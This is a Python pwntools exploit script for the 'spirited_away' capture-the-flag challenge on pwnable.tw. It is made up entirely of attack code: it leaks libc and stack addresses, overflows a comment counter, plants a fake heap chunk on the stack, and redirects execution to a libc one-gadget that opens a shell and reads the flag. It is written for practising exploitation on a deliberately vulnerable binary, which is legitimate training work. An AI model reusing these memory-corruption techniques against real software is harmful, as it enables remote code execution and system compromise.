from pwn import *
ru=lambda s:p.recvuntil(s)
rl=lambda :p.recvline()
rul=lambda s:p.recvuntil(s+'\n')
sl=lambda s:p.sendline(str(s))
sd=lambda s:p.send(s)
rn=lambda n:p.recvn(n)

def run(ip=None,port=None):
    global p,is_debug
    if ip and port:
        is_debug=False
        p=remote(ip,port)
    elif libpath and binarypath:
        p=process(binarypath,env={'LD_PRELOAD':libpath})
    else:
        p=process(binarypath)

def enter_name(name):
    ru("Please enter your name: ")
    sd(name)
def enter_age(age):
    ru("Please enter your age: ")
    sl(age)
def enter_reason(reason):
    ru("Why did you came to see this movie? ")
    sd(reason)
def enter_comment(comment):
    ru("Please enter your comment: ")
    sd(comment)
def next(a=1):
    line=ru("Would you like to leave another comment? <y/n>: ")
    if a==1:
        sl("Y")
    else:
        sl("N")
def debugf(s=''):
    if is_debug:
        gdb.attach(p,s)
def step(not_in=0):
    if not_in:
        enter_name("")
    else:
        enter_name("name\x00\n")
    enter_age("1")
    enter_reason("reason\x00\n")
    if not_in:
        enter_comment("")
    else:
        enter_comment("comment\x00\n")
    next()  
from struct import pack,unpack
def exp(ip=None,port=None):
    run(ip=ip,port=port)
    enter_name("1\n")
    enter_age("1")
    enter_reason("a"*0x34+'b')
    enter_comment("\x40")
    ru('Reason: ')
    rn(0x34)
    libc_addr=u32(rn(4))-0x1b0062 # reason
    stack_addr=u32(rn(4))
    reason_addr=stack_addr-0x70
    next()
    
    def cyclic():
        j=0
        for i in range(9):
            step()
            j+=1
            print(j)
        for i in range(90):
            step(1)  
            j+=1
            print(j)       
    cyclic()
    debugf('nb 804874B')
    enter_name("1\n")
    enter_age(1)
    fake_chunk={
        0:p32(0),
        4:p32(0x41),
        0x44:p32(0x21)
    }
    one_off=0x3a819
    # one_off=0x5f065
    # one_off=0x5f066
    one=libc_addr+one_off
    enter_reason(fit(fake_chunk,filler="\xff"))
    enter_comment('\xff'*(0xa8-0x54)+p32(reason_addr+0x8))
    next()
    enter_name('a'*0x48+p32(0)+p32(one)+'\n')
    enter_age(1)
    enter_reason("1\n")
    enter_comment("1\n")
    next(0)
    ru('Bye!')
    p.sendline("cat /home/spirited_away/flag")
    # sl(1)
    p.interactive()

context.terminal=['tmux','new-window']
# context(log_level='debug',os='linux',arch='amd64')
# context.log_level="debug"
context(os='linux',arch='i386')
context.aslr=True
p=None
libpath="./libc_32.so.6"
binarypath=["./spirited_away"]
is_debug=True
exp("chall.pwnable.tw",10204)
# exp()
